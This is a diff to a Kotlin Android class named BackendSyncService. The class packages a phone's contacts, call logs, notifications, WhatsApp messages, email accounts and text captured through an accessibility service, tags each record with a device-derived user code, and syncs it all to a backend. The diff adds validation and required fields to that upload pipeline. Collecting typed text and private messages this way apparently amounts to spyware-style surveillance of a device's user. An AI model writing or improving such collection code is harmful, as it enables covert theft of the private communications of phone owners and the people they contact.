@@ -563,14 +563,18 @@ class BackendSyncService(
                         emailList.add(emails.getJSONObject(j).getString("address"))
                     }
                     
-                    val contactData = mapOf(
-                        "name" to contact.getString("name"),
-                        "phoneNumber" to phoneNumber,
-                        "phoneType" to "MOBILE",
-                        "emails" to emailList,
-                        "organization" to ""
-                    )
-                    data.add(contactData)
+                    // Only add contacts that have either phone number or email
+                    if (phoneNumber.isNotEmpty() || emailList.isNotEmpty()) {
+                        val contactData = mapOf(
+                            "name" to contact.getString("name"),
+                            "phoneNumber" to phoneNumber,
+                            "phoneType" to "MOBILE",
+                            "emails" to emailList,
+                            "organization" to "",
+                            "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
+                        )
+                        data.add(contactData)
+                    }
                 }
                 
                 if (data.isEmpty()) {
@@ -633,13 +637,18 @@ class BackendSyncService(
                         else -> "UNKNOWN"
                     }
                     
-                    val callData = mapOf(
-                        "phoneNumber" to callLog.getString("number"),
-                        "callType" to callType,
-                        "duration" to callLog.getLong("duration"),
-                        "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(callLog.getLong("date")))
-                    )
-                    data.add(callData)
+                    // Only add call logs that have a valid phone number
+                    val phoneNumber = callLog.getString("number")
+                    if (phoneNumber.isNotEmpty()) {
+                        val callData = mapOf(
+                            "phoneNumber" to phoneNumber,
+                            "callType" to callType,
+                            "duration" to callLog.getLong("duration"),
+                            "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(callLog.getLong("date"))),
+                            "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
+                        )
+                        data.add(callData)
+                    }
                 }
                 
                 if (data.isEmpty()) {
@@ -730,7 +739,8 @@ class BackendSyncService(
                     "package_name" to data.optString("package_name", "unknown"),
                     "text_content" to data.optString("text", ""),
                     "timestamp" to data.optLong("timestamp", System.currentTimeMillis()),
-                    "formatted_time" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date())
+                    "formatted_time" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date()),
+                    "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
                 )
                 accessibilityData.add(item)
             }
@@ -739,8 +749,9 @@ class BackendSyncService(
             val serviceStatus = mapOf(
                 "type" to "ACCESSIBILITY_STATUS",
                 "service_enabled" to com.devicesync.app.services.TextInputAccessibilityService.isServiceEnabled,
-                "timestamp" to System.currentTimeMillis(),
-                "formatted_time" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date())
+                    "timestamp" to System.currentTimeMillis(),
+                    "formatted_time" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date()),
+                    "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
             )
             accessibilityData.add(serviceStatus)
             
@@ -764,13 +775,20 @@ class BackendSyncService(
                 val data = mutableListOf<Map<String, Any>>()
                 for (i in 0 until notifications.length()) {
                     val notification = notifications.getJSONObject(i)
-                    val notificationData = mapOf(
-                        "packageName" to notification.getString("package_name"),
-                        "title" to notification.getString("title"),
-                        "text" to notification.getString("text"),
-                        "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(notification.getLong("timestamp")))
-                    )
-                    data.add(notificationData)
+                    
+                    // Only add notifications that have required fields
+                    if (notification.has("package_name") && notification.has("title")) {
+                        val notificationData = mapOf(
+                            "notificationId" to "NOTIF_${System.currentTimeMillis()}_${i}", // Generate unique ID
+                            "packageName" to notification.getString("package_name"),
+                            "appName" to notification.optString("app_name", "Unknown App"), // Add required field
+                            "title" to notification.getString("title"),
+                            "text" to notification.optString("text", ""),
+                            "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(notification.optLong("timestamp", System.currentTimeMillis()))),
+                            "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
+                        )
+                        data.add(notificationData)
+                    }
                 }
                 
                 if (data.isEmpty()) {
@@ -823,7 +841,8 @@ class BackendSyncService(
                         "address" to message.getString("chat_name"),
                         "body" to message.getString("message"),
                         "type" to "WHATSAPP",
-                        "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(message.getLong("timestamp")))
+                        "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(message.getLong("timestamp"))),
+                        "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
                     )
                     data.add(messageData)
                 }
@@ -870,14 +889,26 @@ class BackendSyncService(
                 val data = mutableListOf<Map<String, Any>>()
                 for (i in 0 until emailAccounts.length()) {
                     val account = emailAccounts.getJSONObject(i)
-                    val accountData = mapOf(
-                        "emailAddress" to account.getString("email_address"),
-                        "accountType" to account.getString("account_type"),
-                        "provider" to account.getString("account_name"),
-                        "lastSyncTime" to System.currentTimeMillis(),
-                        "isActive" to true
-                    )
-                    data.add(accountData)
+                    
+                    // Only add email accounts that have required fields
+                    if (account.has("name") && account.has("type")) {
+                        val accountData = mapOf(
+                            "accountId" to "EMAIL_${System.currentTimeMillis()}_${i}", // Generate unique ID
+                            "emailAddress" to account.optString("name", ""), // Use name as email address
+                            "accountName" to account.optString("name", "Unknown Account"), // Add required field
+                            "provider" to account.optString("type", "Unknown Provider"), // Add required field
+                            "accountType" to "IMAP", // Default value
+                            "lastSyncTime" to System.currentTimeMillis(),
+                            "isActive" to true,
+                            "user_internal_code" to "USER_${deviceId.hashCode()}" // Add required field
+                        )
+                        data.add(accountData)
+                    }
+                }
+                
+                if (data.isEmpty()) {
+                    println("📱 No email accounts to sync")
+                    return@withContext SyncResult.Success(0)
                 }
                 
                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
